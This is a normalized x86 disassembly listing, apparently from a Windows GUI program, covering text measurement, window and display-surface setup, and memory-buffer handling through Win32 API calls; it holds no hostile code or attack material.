mov [ esi + 0x10 ] edx
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
mov eax [ esp + 0x8c ]
add ecx edi
sub eax [ esp + 0x84 ]
cmp ecx eax
mov [ esi + 0x14 ] ecx
jge r-xdata
mov eax [ esp + 0x14 ]
cmp [ ebx + eax ] 0xd
jne r-xdata
mov edi [ esp + 0x20 ]
add edi [ esp + 0x40 ]
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esp + 0x4c ]
lea edx [ esp + 0x70 ]
push edx
push ecx
mov ecx [ esp + 0x20 ]
push eax
push ecx
call [ GetTextExtentPoint32A@IAT ]
test edi edi
jle r-xdata
test edi edi
jle r-xdata
mov ecx 0x2
jmp r-xdata
cmp al 0x81
jne r-xdata
mov edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esp + 0x10 ]
mov esi [ esp + 0x84 ]
mov edx [ ecx + 0x14 ]
mov [ ecx + 0x10 ] eax
mov eax [ esp + 0x8c ]
sub eax esi
cmp edx eax
jge r-xdata
inc esi
mov [ esp + 0x60 ] esi
xor edi edi
jmp r-xdata
cmp [ esi + eax + 0x1 ] 0xa
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x28 ]
add eax ecx
add edi eax
cmp esi [ ebx + 0xd34 ]
mov [ esp + 0x34 ] edi
je r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x78 ]
push eax
push ecx
lea eax [ esi + edx ]
push eax
mov eax [ esp + 0x24 ]
push eax
call [ GetTextExtentPoint32A@IAT ]
test edi edi
jle r-xdata
test edi edi
jle r-xdata
cmp [ esp + 0x20 ] ebx
je r-xdata
cmp [ ecx + esi + 0x1 ] 0x73
jne r-xdata
mov edx [ esp + 0x80 ]
mov ecx [ esi + 0x10 ]
mov [ esi + 0x14 ] eax
mov eax [ esp + 0x88 ]
sub eax edx
cmp ecx eax
jge r-xdata
inc ebx
mov [ esp + 0x60 ] ebx
xor edi edi
jmp r-xdata
cmp [ ebx + eax + 0x1 ] 0xa
jne r-xdata
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x30 ]
add edx eax
mov eax [ esi + 0xd34 ]
add edi edx
cmp ebx eax
mov [ esp + 0x20 ] edi
je r-xdata
mov eax [ esp + 0x70 ]
mov esi [ esp + 0x28 ]
add edi eax
add edi [ esp + 0x1c ]
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov eax [ rw-data ]
imul eax [ esp + 0x1c ]
add edi eax
jmp r-xdata
cmp al 0x9
mov [ esp + 0x38 ] ecx
jne r-xdata
cmp [ ecx + ebx + 0x1 ] 0x73
jne r-xdata
mov [ ecx + 0x14 ] eax
mov [ esp + 0x24 ] esi
inc esi
test ebx ebx
mov eax [ esp + 0x7c ]
je r-xdata
add edi [ esp + 0x1c ]
mov eax [ rw-data ]
test eax eax
jle r-xdata
mov edx [ rw-data ]
imul edx [ esp + 0x1c ]
add edi edx
jmp r-xdata
cmp al 0x81
jne r-xdata
lea eax [ esp + 0x54 ]
push eax
mov eax [ esp + 0x64 ]
lea ecx [ esp + 0x48 ]
push ecx
mov ecx [ esp + 0x1c ]
mov edx esi
sub edx eax
push edx
add ecx eax
push ecx
call sub_439f30
mov eax [ esp + 0x54 ]
add esp 0x10
test eax eax
je r-xdata
mov [ esi + 0x10 ] eax
jmp r-xdata
mov [ esp + 0x24 ] ebx
lea esp [ esp ]
inc ebx
add ebx [ esp + 0x38 ]
jmp r-xdata
cmp edi [ esp + 0x2c ]
jle r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ rw-data ]
imul ecx esi
lea eax [ ecx + edi ]
cdq
idiv ecx
imul eax [ rw-data ]
imul eax esi
mov edi eax
jmp r-xdata
mov ecx eax
dec ecx
imul ecx [ esp + 0x1c ]
add edi ecx
cmp al 0x81
jne r-xdata
lea eax [ esp + 0x48 ]
push eax
mov eax [ esp + 0x64 ]
lea ecx [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x1c ]
mov edx ebx
sub edx eax
push edx
add ecx eax
push ecx
call sub_439f30
mov eax [ esp + 0x4c ]
add esp 0x10
test eax eax
je r-xdata
add edi eax
mov eax [ esp + 0x78 ]
mov ebx [ rw-data ]
mov ecx ebx
imul ecx [ esp + 0x28 ]
lea eax [ ecx + edi ]
cdq
idiv ecx
imul eax ebx
imul eax [ esp + 0x28 ]
mov edi eax
jmp r-xdata
dec eax
imul eax [ esp + 0x1c ]
add edi eax
cmp [ esi + ecx + 0x1 ] 0x62
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0xd34 ]
add esi 0x2
cmp esi eax
mov [ esp + 0x24 ] esi
je r-xdata
mov eax [ esp + 0x54 ]
test eax eax
jne r-xdata
cmp [ esp + 0x38 ] 0x2
jne r-xdata
mov edx [ esp + 0x60 ]
cmp edx ebx
je r-xdata
cmp [ ebx + ecx + 0x1 ] 0x62
jne r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx + 0xd34 ]
add ebx 0x2
cmp ebx eax
mov [ esp + 0x24 ] ebx
je r-xdata
mov eax [ esp + 0x48 ]
test eax eax
jne r-xdata
add esi [ esp + 0x38 ]
jmp r-xdata
cmp edi [ esp + 0x2c ]
jle r-xdata
cmp [ esp + 0x60 ] esi
je r-xdata
add esi 0x2
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov al [ esi + ecx ]
cmp al 0xd
je r-xdata
mov edx ecx
mov ecx [ esp + 0x14 ]
mov ecx ebx
add ecx 0xd38
call sub_43a080
test eax eax
jbe r-xdata
mov edi [ esp + 0x10 ]
lea ecx [ esp + 0x60 ]
mov eax ebx
sub eax edx
push ecx
add edi 0xd38
mov ecx edi
mov [ esp + 0x68 ] eax
call sub_43a670
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
mov al [ ebx + ecx ]
cmp al 0x81
jne r-xdata
add ebx 0x2
jmp r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ ebx + ecx ]
mov [ esp + 0x4c ] eax
mov al [ eax ]
cmp al 0xd
je r-xdata
mov esi [ esp + 0x14 ]
mov ecx edx
lea esp [ esp ]
mov ecx esi
add ecx 0xd38
call sub_43a080
test eax eax
jbe r-xdata
cmp [ esp + 0x38 ] 0x2
jne r-xdata
inc esi
cmp al 0x81
jne r-xdata
mov edx ebx
mov eax [ edx + 0xd40 ]
mov ecx [ eax - 0x4 ]
mov ebx [ eax - 0x8 ]
lea eax [ esp + 0x48 ]
push eax
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x54 ]
push edx
push ecx
mov [ esp + 0x44 ] ecx
lea ecx [ ebx + eax ]
push ecx
call sub_439f30
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x60 ]
add esp 0x10
cmp edx eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x20 ]
add eax esi
add ecx eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x60 ] ebx
xor edi edi
jmp r-xdata
mov edi [ edi + 0x8 ]
sub edi eax
sar edi 0x3
cmp edi 0x1
jbe r-xdata
cmp [ ebx + ecx + 0x1 ] 0x41
je r-xdata
inc ebx
cmp al 0x81
jne r-xdata
mov edx esi
mov eax [ edx + 0xd40 ]
mov ecx [ eax - 0x4 ]
mov esi [ eax - 0x8 ]
lea eax [ esp + 0x34 ]
push eax
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x48 ]
push edx
push ecx
mov [ esp + 0x44 ] ecx
lea ecx [ esi + eax ]
push ecx
call sub_439f30
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x54 ]
add esp 0x10
cmp edx eax
jne r-xdata
mov ebx [ esp + 0x60 ]
mov edi [ esp + 0x10 ]
mov ecx esi
sub ecx ebx
lea edx [ esp + 0x60 ]
mov [ esp + 0x64 ] ecx
add edi 0xd38
push edx
mov ecx edi
call sub_43a670
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x30 ]
add eax ecx
mov ecx [ esp + 0x34 ]
add ecx eax
mov [ esp + 0x58 ] edi
mov [ esp + 0x34 ] ecx
mov [ esp + 0x60 ] esi
xor edi edi
jmp r-xdata
mov eax [ esp + 0x14 ]
mov cl [ esi + eax ]
cmp cl 0x81
jne r-xdata
mov al [ esi + ecx ]
mov bl al
xor bl 0x20
add bl 0x5f
cmp bl 0x3b
ja r-xdata
jmp r-xdata
add esi 0x2
jmp r-xdata
cmp [ ecx + esi + 0x1 ] 0x74
je r-xdata
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x38 ]
add eax ebx
mov [ esp + 0x58 ] edi
add ebx ecx
xor edi edi
cmp eax ebx
mov [ esp + 0x3c ] eax
jge r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x40 ]
add eax edx
mov [ esp + 0x20 ] eax
cmp al al
jne r-xdata
mov al [ ebx + esi ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
jmp r-xdata
add ebx 0x2
jmp r-xdata
cmp [ esi + ebx + 0x1 ] 0x74
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x38 ]
lea ebx [ esi + eax ]
mov [ esp + 0x4c ] edi
add esi ecx
xor edi edi
cmp ebx esi
jge r-xdata
mov dl [ esi + eax + 0x1 ]
cmp dl 0x41
je r-xdata
cmp esi [ edx + 0xd34 ]
jne r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax + 0xd40 ]
mov ecx [ esp + 0x48 ]
mov esi [ esp + 0x58 ]
mov [ edx - 0x4 ] ecx
mov eax [ eax + 0xd40 ]
mov eax [ eax - 0x8 ]
add edi esi
mov esi [ esp + 0x24 ]
add eax ecx
mov [ esp + 0x60 ] eax
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x14 ]
mov cl [ eax + edx ]
add eax edx
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
mov [ esp + 0x4c ] eax
ja r-xdata
cmp [ ebx + ecx + 0x1 ] 0x42
je r-xdata
cmp ebx [ ecx + 0xd34 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0xd40 ]
mov eax [ esp + 0x34 ]
mov esi [ esp + 0x4c ]
mov ebx [ esp + 0x24 ]
mov [ edx - 0x4 ] eax
mov ecx [ ecx + 0xd40 ]
mov ecx [ ecx - 0x8 ]
add edi esi
add ecx eax
mov [ esp + 0x60 ] ecx
mov edx [ esp + 0x14 ]
mov cl [ ebx + edx ]
lea eax [ ebx + edx ]
xor cl 0x20
add cl 0x5f
mov dl 0x3b
cmp dl cl
mov edx [ esp + 0x18 ]
sbb esi esi
lea ecx [ esp + 0x78 ]
push ecx
add esi 0x2
push esi
push eax
push edx
call [ GetTextExtentPoint32A@IAT ]
test edi edi
jle r-xdata
cmp cl cl
jne r-xdata
mov esi 0x1
xor ebx ebx
mov esi 0x2
mov ebx 0x1
jmp r-xdata
mov ecx [ esp + 0x78 ]
mov eax [ esp + 0x10 ]
mov eax [ eax + 0xd40 ]
mov edx [ eax - 0x4 ]
add edi ecx
mov ecx [ eax - 0x8 ]
add ebx esi
add ecx edx
cmp ebx ecx
jl r-xdata
add edi [ esp + 0x1c ]
mov cl dl
cmp cl 0x42
je r-xdata
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x70 ]
push ecx
push esi
push edx
push eax
call [ GetTextExtentPoint32A@IAT ]
test edi edi
jle r-xdata
mov edx [ esp + ebx * 4 + 0x68 ]
mov eax [ esp + 0x18 ]
push edx
push eax
mov [ esp + 0x28 ] ebx
call [ SelectObject@IAT ]
cmp [ esp + 0x20 ] ebx
je r-xdata
test ebx ebx
mov eax [ esp + 0x74 ]
je r-xdata
add edi [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x3c ]
add edi eax
mov eax [ edx + 0xd40 ]
mov edx [ eax - 0x8 ]
add ecx esi
add edx [ eax - 0x4 ]
cmp ecx edx
mov [ esp + 0x3c ] ecx
jl r-xdata
mov eax [ esp + 0x70 ]
sub_43f940
push ebx
push ebp
push esi
push edi
mov ebx ecx
call sub_439440
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x2c ]
mov ebp [ esp + 0x30 ]
mov ecx 0x10a
mov esi eax
mov edi ebx
[ edi ] [ esi ]
mov ecx [ esp + 0x28 ]
mov esi [ esp + 0x34 ]
mov edi [ esp + 0x38 ]
mov [ ebx + 0x444 ] ecx
mov ecx [ esp + 0x1c ]
mov [ ebx + 0x43c ] esi
mov esi [ esp + 0x14 ]
cmp esi 0x20000010
mov [ ebx + 0x448 ] edx
mov edx [ esp + 0x24 ]
mov [ ebx + 0x42c ] ecx
mov ecx [ esp + 0x20 ]
mov [ ebx + 0x430 ] ecx
mov [ ebx + 0x434 ] edx
mov [ ebx + 0x438 ] ebp
mov [ ebx + 0x440 ] esi
mov [ ebx + 0x458 ] edi
je r-xdata
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
cmp esi 0x2000000c
je r-xdata
lea edx [ ebx + 0x460 ]
xor eax eax
cmp esi 0x2000000c
mov ecx 0xc
mov edi edx
[ edi ]
mov edi [ esp + 0x34 ]
mov [ edx ] ebp
mov [ ebx + 0x464 ] edi
jg r-xdata
mov edi [ esp + 0x34 ]
push 0x0
push 0x1
push edi
push ebp
push 0x0
push 0x0
push edx
mov edx [ esp + 0x38 ]
push ecx
push edx
push eax
push esi
mov ecx ebx
call sub_43ba10
test eax eax
jne r-xdata
cmp esi 0x20000018
jne r-xdata
sub esi 0x20000010
je r-xdata
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn 0x28
mov eax [ ebx + 0x45c ]
test eax eax
je r-xdata
push 0x10
mov ecx ebx
mov [ ebx + 0x474 ] 0x60000004
call sub_435850
mov ecx [ esp + 0x20 ]
push eax
push edi
push ebp
push ecx
mov ecx [ esp + 0x4c ]
lea edx [ esp + 0x44 ]
push edx
call sub_43a6e0
lea esi [ ebx + 0x45c ]
push eax
mov ecx esi
call sub_40a380
mov eax [ esp + 0x30 ]
sub esi 0x8
je r-xdata
mov eax [ ebx + 0x45c ]
test eax eax
lea esi [ ebx + 0x45c ]
mov [ ebx + 0x474 ] 0xa0000008
jne r-xdata
cmp esi 0x10000020
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0x28
mov edx [ esi ]
xor eax eax
test edx edx
setne al
dec eax
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
call sub_43abf0
test eax eax
je r-xdata
sub esi 0x20000008
je r-xdata
mov eax [ eax + 0xc ]
movzx eax [ ebx + 0xe ]
imul eax [ ebx + 0x4 ]
add eax 0x7
cdq
and edx 0x7
add eax edx
sar eax 0x3
add eax 0x3
and eax 0xfffffffc
jmp r-xdata
cmp esi 0x20000008
jne r-xdata
je r-xdata
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
mov ecx ebx
call sub_435850
push 0x10
lea edi [ ebx + 0x460 ]
push edi
lea ecx [ esp + 0x28 ]
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x40 ]
push ecx
mov [ ebx + 0x474 ] 0x60000004
mov edx [ eax ]
push eax
call [ edx + 0x38 ]
lea esi [ ebx + 0x45c ]
push eax
mov ecx esi
call sub_40a380
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
mov ecx ebx
call sub_439ce0
test eax eax
jne r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
inc [ eax ]
mov edx [ esp + 0x1c ]
mov ecx [ esp + 0x38 ]
push 0xc
push eax
push edi
push ebp
push edx
lea eax [ esp + 0x3c ]
push eax
call sub_43a6e0
mov eax [ eax ]
test eax eax
je r-xdata
mov ecx ebx
call sub_439ce0
test eax eax
jne r-xdata
sub esi 0x10000001
je r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ eax ] 0x1
mov ecx eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x28
mov eax [ ebx + 0x45c ]
test eax eax
lea esi [ ebx + 0x45c ]
jne r-xdata
mov [ esi ] eax
mov eax [ esp + 0x28 ]
jmp r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ ebx + 0x45c ]
test eax eax
lea esi [ ebx + 0x45c ]
jne r-xdata
sub esi 0x17
jne r-xdata
mov ecx ebx
call sub_435850
mov ecx [ esi ]
mov ebp eax
call sub_4167e0
mov edx [ esp + 0x24 ]
mov ecx [ ebx + 0x464 ]
push ebp
push edx
mov edx [ edi ]
push ecx
push edx
push eax
mov eax [ esp + 0x30 ]
push eax
call [ rw-data ]
mov edx [ esi ]
xor eax eax
test edx edx
setne al
pop edi
pop esi
pop ebp
pop ebx
dec eax
retn 0x28
dec [ ecx ]
mov eax [ eax + 0x4 ]
dec [ eax + 0xc ]
push 0x20
mov ecx ebx
mov [ ebx + 0x474 ] 0x50000002
call sub_435850
mov ecx [ ebx + 0x464 ]
mov edx [ ebx + 0x460 ]
push eax
mov eax [ ebx + 0x42c ]
push ecx
push edx
push eax
lea ecx [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x50 ]
call sub_43a6e0
push eax
mov ecx esi
call sub_40a380
lea ecx [ esp + 0x2c ]
call sub_40a3b0
mov edx [ esi ]
xor eax eax
test edx edx
setne al
pop edi
pop esi
pop ebp
pop ebx
dec eax
retn 0x28
test eax eax
je r-xdata
dec [ ecx ]
mov edx [ ecx + 0x4 ]
dec [ edx + 0xc ]
push 0x8
mov ecx ebx
mov [ ebx + 0x474 ] 0x0
call sub_435850
mov ecx [ ebx + 0x464 ]
mov edx [ ebx + 0x460 ]
push eax
mov eax [ ebx + 0x42c ]
push ecx
push edx
push eax
lea ecx [ esp + 0x2c ]
push ecx
mov ecx [ esp + 0x50 ]
call sub_43a6e0
push eax
mov ecx esi
call sub_40a380
lea ecx [ esp + 0x18 ]
call sub_40a3b0
mov edx [ esi ]
xor eax eax
test edx edx
setne al
pop edi
pop esi
pop ebp
pop ebx
dec eax
retn 0x28
mov ecx ebx
call sub_439ce0
test eax eax
jne r-xdata
mov eax [ ebx + 0x45c ]
test eax eax
lea esi [ ebx + 0x45c ]
jne r-xdata
push 0x18
mov ecx ebx
mov [ ebx + 0x474 ] 0x50000001
call sub_435850
mov ecx [ ebx + 0x460 ]
mov edx [ ebx + 0x42c ]
push eax
mov eax [ ebx + 0x464 ]
push eax
push ecx
mov ecx [ esp + 0x48 ]
push edx
lea eax [ esp + 0x48 ]
push eax
call sub_43a6e0
push eax
mov ecx esi
call sub_40a380
lea ecx [ esp + 0x34 ]
call sub_40a3b0
mov edx [ esi ]
xor eax eax
test edx edx
setne al
pop edi
pop esi
pop ebp
pop ebx
dec eax
retn 0x28
sub_43fd90
push 0xffffffff
push sub_4c034a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
xor edx edx
mov [ esp + 0x4 ] esi
mov [ esi + 0x884 ] edx
lea ecx [ esi + 0x890 ]
mov [ esp + 0x10 ] edx
call sub_439410
mov [ esi + 0xd3c ] edx
mov [ esi + 0xd40 ] edx
mov [ esi + 0xd44 ] edx
mov ecx esi
mov [ esp + 0x10 ] 0x2
mov [ esi + 0xd48 ] edx
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edx
mov [ esi + 0x1c ] edx
mov [ esi + 0x20 ] edx
mov [ esi + 0x458 ] edx
mov [ esi + 0xd20 ] edx
mov [ esi + 0xd24 ] edx
mov [ esi + 0xd30 ] edx
call sub_43d760
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_43fe30
push 0xffffffff
push sub_4c034a
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0x2
call sub_43d760
mov eax [ esi + 0xd3c ]
test eax eax
je r-xdata
lea ecx [ esi + 0x890 ]
mov [ esi + 0xd3c ] 0x0
mov [ esi + 0xd40 ] 0x0
mov [ esi + 0xd44 ] 0x0
call sub_43a1f0
mov esi [ esi + 0x884 ]
test esi esi
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
cmp [ esi ] 0x1
jne r-xdata
dec [ esi ]
mov eax [ esi + 0x4 ]
dec [ eax + 0xc ]
sub_43fec0
push 0xffffffff
push sub_4c01f8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
mov ecx rw-data
mov [ esp + 0x8 ] rw-data
call sub_404310
mov eax [ rw-data ]
mov esi [ FreeLibrary@IAT ]
xor edi edi
cmp eax edi
mov [ esp + 0x14 ] edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call esi
mov [ rw-data ] edi
call sub_43d170
mov ecx rw-data
call sub_401420
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call esi
mov [ rw-data ] edi
sub_43ff60
push 0xffffffff
push sub_4c0368
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
push ebx
push ebp
push esi
push edi
mov ecx rw-data
mov [ esp + 0x50 ] rw-data
call sub_404310
mov eax [ rw-data ]
test eax eax
mov [ esp + 0xc8 ] 0x0
je r-xdata
mov ecx rw-data
call sub_401420
xor eax eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0xd0 ]
lea eax [ esp + 0x10 ]
push eax
push ecx
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x18 ]
mov ebp [ esp + 0x10 ]
mov ecx edx
sub ecx ebp
test ecx ecx
jle r-xdata
mov esi [ esp + 0x1c ]
mov ebx [ esp + 0x14 ]
mov eax esi
sub eax ebx
test eax eax
jle r-xdata
and ecx 0x1
add edx ecx
mov cl [ rw-data ]
and eax 0x1
add esi eax
test cl 0x2
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] esi
je r-xdata
test cl 0x4
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edi eax
shr edi 0x1
add edi ebp
neg eax
and edi eax
mov ebp edi
mov [ esp + 0x10 ] ebp
xor eax eax
sub esi ebx
mov ecx 0x1b
lea edi [ esp + 0x54 ]
[ edi ]
mov eax [ rw-data ]
mov [ esp + 0x5c ] esi
sub edx ebp
push 0x0
mov [ esp + 0x58 ] 0x6c
mov [ esp + 0x5c ] 0x1007
mov [ esp + 0xc0 ] 0x4080
mov [ esp + 0x64 ] edx
mov ecx 0x8
lea esi [ esp + 0x34 ]
lea edi [ esp + 0xa0 ]
mov [ esp + 0x34 ] 0x20
mov [ esp + 0x38 ] 0x4
mov [ esp + 0x3c ] 0x32595559
mov [ esp + 0x40 ] 0x10
[ edi ] [ esi ]
mov edx [ eax ]
push rw-data
lea ecx [ esp + 0x5c ]
push ecx
push eax
call [ edx + 0x18 ]
test eax eax
jne r-xdata
mov edi [ rw-data ]
sub edi [ rw-data ]
mov ecx edx
sub ecx ebp
cmp ecx edi
jne r-xdata
neg eax
and edx eax
mov [ esp + 0x18 ] edx
test [ rw-data ] 0x10
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ebx [ esp + 0x14 ]
mov esi [ esp + 0x1c ]
mov ebp [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov [ rw-data ] 0x0
mov edi [ rw-data ]
sub edi [ rw-data ]
mov eax esi
sub eax ebx
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov esi [ rw-data ]
xor eax eax
mov ecx 0xe
mov edi rw-data
[ edi ]
push 0xa000a
mov [ rw-data ] 0x38
call sub_439da0
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ rw-data ]
add esp 0x4
or eax 0x80800
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edi edi
mov [ esp + 0x2c ] esi
mov esi [ GetSystemMetrics@IAT ]
push edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] eax
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] edx
call esi
push 0x1
mov edi eax
call esi
mov ecx [ esp + 0x20 ]
xor edx edx
cmp ecx edx
jge r-xdata
mov eax [ esp + 0xd4 ]
test eax eax
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
mov [ rw-data ] edx
je r-xdata
mov ecx [ esp + 0x28 ]
cmp ecx edi
jle r-xdata
sub [ esp + 0x30 ] ecx
mov [ esp + 0x20 ] edx
call sub_43d290
mov ecx rw-data
call sub_401420
mov eax 0x1
jmp r-xdata
mov [ eax ] esi
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
mov [ eax + 0xc ] edx
mov ecx [ esp + 0x24 ]
cmp ecx edx
jge r-xdata
mov esi edi
sub esi ecx
add [ esp + 0x38 ] esi
mov [ esp + 0x28 ] edi
mov ecx [ esp + 0xc0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xbc
retn
mov ecx [ esp + 0x2c ]
cmp ecx eax
jle r-xdata
sub [ esp + 0x34 ] ecx
mov [ esp + 0x24 ] edx
mov eax [ esp + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov edx eax
sub edx ecx
add [ esp + 0x3c ] edx
mov [ esp + 0x2c ] eax
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ eax ]
push rw-data
push edx
lea edx [ esp + 0x28 ]
push edx
mov edx [ rw-data ]
push edx
lea edx [ esp + 0x40 ]
push edx
push eax
call [ ecx + 0x84 ]
jmp r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ rw-data ]
jne r-xdata
mov edx [ esp + 0x18 ]
cmp edx [ rw-data ]
jne r-xdata
mov eax [ esp + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
sub_4402e0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0390
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1ba8
call sub_4b6180
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
mov ebx ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ebx
mov [ ebx ] eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
push esi
call [ LocalSize@IAT ]
mov edi eax
push esi
mov [ ebp - 0x18 ] edi
call [ LocalLock@IAT ]
test eax eax
mov [ ebp - 0x14 ] eax
je r-xdata
mov ecx ebx
call sub_43d760
mov eax [ ebp + 0x10 ]
cmp eax 0x7
ja r-xdata
push esi
call [ LocalUnlock@IAT ]
mov al [ ebp + 0x14 ]
test al al
je r-xdata
jmp [ eax * 4 + jump_table_441184 ]
push esi
call [ LocalFree@IAT ]
inc edi
push edi
call j_sub_4b573e#2
add esp 0x4
test eax eax
mov [ ebx + 0xd30 ] eax
je r-xdata
push 0x1
call sub_43a9a0
add esp 0x4
test eax eax
je r-xdata
push 0x1
call sub_43aa90
add esp 0x4
test eax eax
je r-xdata
push 0x2
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
cmp edi 0xe
jbe r-xdata
push 0x1
call sub_43a840
add esp 0x4
test eax eax
je r-xdata
xor eax eax
push eax
push eax
lea ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x14 ]
lea edx [ ebp + 0x18 ]
push edx
push eax
push edi
push ecx
push eax
push eax
mov [ ebp + 0x18 ] eax
mov [ ebp + 0x8 ] eax
call sub_4b3ee0
add esp 0x24
test eax eax
jne r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push 0x0
push 0x0
push edx
push eax
push 0x0
push 0x1
push esi
push ecx
mov ecx ebx
call sub_4402e0
mov edi eax
test edi edi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edx [ ebp - 0x18 ]
mov esi [ ebp - 0x14 ]
mov ecx edx
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0xd30 ]
mov [ edx + ecx ] 0x0
mov [ ebx + 0xd34 ] edx
mov edx [ rw-data ]
push edx
mov ecx ebx
call sub_43ee40
test eax eax
jne r-xdata
xor eax eax
mov ecx 0x6dc
lea edi [ ebp - 0x1bb8 ]
[ edi ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x1bb8 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
push 0x1
